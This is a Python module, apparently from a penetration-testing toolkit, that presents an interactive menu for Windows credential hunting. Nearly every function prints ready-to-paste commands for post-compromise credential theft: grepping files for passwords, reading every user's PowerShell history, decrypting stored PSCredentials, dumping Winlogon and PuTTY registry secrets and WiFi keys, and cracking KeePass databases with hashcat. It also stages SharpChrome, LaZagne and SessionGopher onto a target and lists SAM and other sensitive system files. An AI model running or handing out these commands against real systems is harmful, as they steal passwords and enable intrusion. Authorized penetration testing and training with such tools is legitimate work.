import subprocess
from pathlib import Path

from modules.upload.windows import (
    stage_windows_files
)

# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
W_BOLD = '\033[1m'


TOOLS = (
    Path(__file__)
    .resolve()
    .parents[3]
    / "tools"
)

# =========================================================
# HELPERS
# =========================================================

def box(cmd):

    print(
        f"{G}"
        f"┌──────────────────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"{cmd}"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────┘{W}\n"
    )


def tool_transfer(name):

    path = TOOLS / name

    if not path.exists():

        print(
            f"\n{R}[!] Tool not found:{W}"
        )

        print(f"  {path}")

        return

    print(
        f"\n{B}[*]{W} "
        f"TRANSFERRING "
        f"{Y}{name}{W}"
    )

    stage_windows_files(
        [str(path)]
    )


# =========================================================
# SEARCH FILES
# =========================================================

def search_files():

    print(
        f"\n{W_BOLD}"
        f"[*] SEARCH FILES{W}\n"
    )

    box(
        'findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml'
    )

    box(
        'findstr /SI /M "password" *.xml *.ini *.txt'
    )

    box(
        'findstr /si password *.xml *.ini *.txt *.config'
    )

    box(
        'findstr /spin "password" *.*'
    )

    box(
        'select-string -Path C:\\Users\\*\\Documents\\*.txt -Pattern password'
    )

    box(
        'dir /S /B *pass*.txt *pass*.xml *pass*.ini *cred* *vnc* *.config*'
    )

    box(
        'where /R C:\\ *.config'
    )

    box(
        'Get-ChildItem C:\\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore'
    )

    box(
        'type C:\\inetpub\\wwwroot\\web.config'
    )

    box(
        'dir C:\\ /s /b unattend.xml'
    )


# =========================================================
# POWERSHELL HISTORY
# =========================================================

def powershell_history():

    print(
        f"\n{W_BOLD}"
        f"[*] POWERSHELL HISTORY{W}\n"
    )

    box(
        '(Get-PSReadLineOption).HistorySavePath'
    )

    box(
        'gc (Get-PSReadLineOption).HistorySavePath'
    )

    box(
        'foreach($user in ((ls C:\\users).fullname)){cat "$user\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}'
    )


# =========================================================
# POWERSHELL CREDS
# =========================================================

def powershell_creds():

    print(
        f"\n{W_BOLD}"
        f"[*] POWERSHELL CREDENTIALS{W}\n"
    )

    box(
        "Get-ChildItem -Path C:\\ -Filter *.xml -Recurse -ErrorAction SilentlyContinue"
    )

    box(
        "$credential = Import-Clixml -Path 'C:\\scripts\\pass.xml'"
    )

    box(
        '$credential.GetNetworkCredential().username'
    )

    box(
        '$credential.GetNetworkCredential().password'
    )


# =========================================================
# CMDKEY
# =========================================================

def cmdkey_creds():

    print(
        f"\n{W_BOLD}"
        f"[*] CMDKEY SAVED CREDENTIALS{W}\n"
    )

    box(
        'cmdkey /list'
    )

    box(
        'runas /savecred /user:DOMAIN\\USER "cmd.exe"'
    )

    box(
        'runas /savecred /user:DOMAIN\\USER "powershell.exe"'
    )


# =========================================================
# STICKY NOTES
# =========================================================

def sticky_notes():

    print(
        f"\n{W_BOLD}"
        f"[*] STICKY NOTES{W}\n"
    )

    box(
        'dir "C:\\Users\\*\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\"'
    )

    box(
        'copy plum.sqlite .'
    )

    box(
        'strings plum.sqlite-wal'
    )

    box(
        'Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap'
    )


# =========================================================
# REGISTRY CREDS
# =========================================================

def registry_creds():

    print(
        f"\n{W_BOLD}"
        f"[*] REGISTRY CREDENTIALS{W}\n"
    )

    box(
        'reg query "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"'
    )

    box(
        'reg query HKEY_CURRENT_USER\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions'
    )

    box(
        'reg query HKEY_CURRENT_USER\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions\\SESSION'
    )


# =========================================================
# WIFI
# =========================================================

def wifi_passwords():

    print(
        f"\n{W_BOLD}"
        f"[*] WIFI PASSWORDS{W}\n"
    )

    box(
        'netsh wlan show profile'
    )

    box(
        'netsh wlan show profile NAME key=clear'
    )


# =========================================================
# KEEPASS
# =========================================================

def keepass():

    print(
        f"\n{W_BOLD}"
        f"[*] KEEPASS{W}\n"
    )

    box(
        'Get-ChildItem C:\\ -Recurse -Include *.kdbx -ErrorAction Ignore'
    )

    box(
        'python2.7 keepass2john.py database.kdbx'
    )

    box(
        'hashcat -m 13400 keepass_hash rockyou.txt'
    )


# =========================================================
# SHARPCHROME
# =========================================================

def sharpchrome():

    tool_transfer(
        "SharpChrome.exe"
    )

    print(
        f"\n{W_BOLD}"
        f"[*] SHARPCHROME{W}\n"
    )

    box(
        '.\\SharpChrome.exe logins /unprotect'
    )


# =========================================================
# LAZAGNE
# =========================================================

def lazagne():

    tool_transfer(
        "lazagne.exe"
    )

    print(
        f"\n{W_BOLD}"
        f"[*] LAZAGNE{W}\n"
    )

    box(
        '.\\lazagne.exe -h'
    )

    box(
        '.\\lazagne.exe all'
    )

    box(
        '.\\lazagne.exe browsers'
    )

    box(
        '.\\lazagne.exe wifi'
    )

    box(
        '.\\lazagne.exe windows'
    )


# =========================================================
# SESSIONGOPHER
# =========================================================

def sessiongopher():

    tool_transfer(
        "SessionGopher.ps1"
    )

    print(
        f"\n{W_BOLD}"
        f"[*] SESSIONGOPHER{W}\n"
    )

    box(
        'Import-Module .\\SessionGopher.ps1'
    )

    box(
        'Invoke-SessionGopher -Target localhost'
    )


# =========================================================
# OTHER FILES
# =========================================================

def interesting_files():

    print(
        f"\n{W_BOLD}"
        f"[*] OTHER INTERESTING FILES{W}\n"
    )

    files = [

        r"%SYSTEMDRIVE%\pagefile.sys",
        r"%WINDIR%\debug\NetSetup.log",
        r"%WINDIR%\repair\sam",
        r"%WINDIR%\repair\system",
        r"%WINDIR%\repair\software",
        r"%WINDIR%\repair\security",
        r"%WINDIR%\iis6.log",
        r"%WINDIR%\system32\config\AppEvent.Evt",
        r"%WINDIR%\system32\config\SecEvent.Evt",
        r"%WINDIR%\system32\config\default.sav",
        r"%WINDIR%\system32\config\security.sav",
        r"%WINDIR%\system32\config\software.sav",
        r"%WINDIR%\system32\config\system.sav",
        r"%WINDIR%\system32\CCM\logs\*.log",
        r"%USERPROFILE%\ntuser.dat",
        r"%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat",
        r"%WINDIR%\System32\drivers\etc\hosts",
        r"C:\ProgramData\Configs\*",
        r"C:\Program Files\Windows PowerShell\*"

    ]

    for f in files:

        box(
            f'dir "{f}"'
        )


# =========================================================
# MAIN
# =========================================================

def run(data=None, cred=None, args=None):

    while True:

        print(
            f"\n{W_BOLD}"
            f"[*] WINDOWS CREDENTIAL HUNTING{W}\n"
        )

        print(f"  {B}[1]{W} Search files")
        print(f"  {B}[2]{W} PowerShell history")
        print(f"  {B}[3]{W} PowerShell credentials")
        print(f"  {B}[4]{W} Saved credentials (cmdkey)")
        print(f"  {B}[5]{W} Registry credentials")
        print(f"  {B}[6]{W} Browser credentials")
        print(f"  {B}[7]{W} KeePass")
        print(f"  {B}[8]{W} Sticky Notes")
        print(f"  {B}[9]{W} WiFi passwords")
        print(f"  {B}[10]{W} LaZagne")
        print(f"  {B}[11]{W} SessionGopher")
        print(f"  {B}[12]{W} Interesting files")
        print(f"  {B}[0]{W} Back")

        try:

            choice = input(
                f"\n{B}select{W}> "
            ).strip()

        except (KeyboardInterrupt, EOFError):

            print()

            return

        if choice == "1":
            search_files()

        elif choice == "2":
            powershell_history()

        elif choice == "3":
            powershell_creds()

        elif choice == "4":
            cmdkey_creds()

        elif choice == "5":
            registry_creds()

        elif choice == "6":
            sharpchrome()

        elif choice == "7":
            keepass()

        elif choice == "8":
            sticky_notes()

        elif choice == "9":
            wifi_passwords()

        elif choice == "10":
            lazagne()

        elif choice == "11":
            sessiongopher()

        elif choice == "12":
            interesting_files()

        elif choice == "0":
            return
